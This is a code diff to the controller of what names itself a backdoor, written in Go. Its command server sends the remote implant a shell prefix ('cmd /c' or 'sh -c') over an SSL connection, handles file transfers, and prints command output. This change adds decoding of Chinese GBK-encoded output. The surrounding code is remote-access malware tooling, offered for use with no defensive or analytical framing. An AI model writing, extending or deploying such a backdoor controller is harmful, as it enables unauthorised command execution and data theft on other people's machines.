@@ -3,13 +3,19 @@ package main
 import (
 	"backdoor/util"
 	"bufio"
+	"bytes"
 	"fmt"
+	"io"
 	"os"
 	"path/filepath"
 	"strconv"
 	"strings"
 	"sync/atomic"
 	"time"
+	"unicode/utf8"
+
+	"golang.org/x/text/encoding/simplifiedchinese"
+	"golang.org/x/text/transform"
 )
 
 type CmdServer struct {
@@ -30,12 +36,12 @@ func NewCmdServer(conn *util.SSLConn) *CmdServer {
 }
 
 func (server *CmdServer) ProcUI(iswin bool, scanner *bufio.Scanner) {
+	if iswin {
+		util.SendCmdMsg(server.conn, util.CMD_SET_SHELL, []byte("cmd /c"))
+	} else {
+		util.SendCmdMsg(server.conn, util.CMD_SET_SHELL, []byte("sh -c"))
+	}
 	for {
-		if iswin {
-			util.SendCmdMsg(server.conn, util.CMD_SET_SHELL, []byte("cmd /c"))
-		} else {
-			util.SendCmdMsg(server.conn, util.CMD_SET_SHELL, []byte("sh -c"))
-		}
 		if !scanner.Scan() {
 			break
 		}
@@ -127,10 +133,26 @@ func (server *CmdServer) loopProc() {
 		case util.CMD_FILE_END:
 			server.procFileEnd(msg)
 		case util.CMD_PRINT:
-			fmt.Println(string(msg))
+			server.procPrint(msg)
 		}
 	}
 	server.exitUI.Store(true)
+}
+
+func Gbk2Utf8(msg []byte) ([]byte, error) {
+	reader := transform.NewReader(bytes.NewReader(msg), simplifiedchinese.GBK.NewDecoder())
+	return io.ReadAll(reader)
+}
+
+func (server *CmdServer) procPrint(msg []byte) {
+	if !utf8.Valid(msg) {
+		tmp, err := Gbk2Utf8(msg)
+		if err == nil {
+			fmt.Println(string(tmp))
+			return
+		}
+	}
+	fmt.Println(string(msg))
 }
 
 func (server *CmdServer) procFileBeg(msg []byte) {
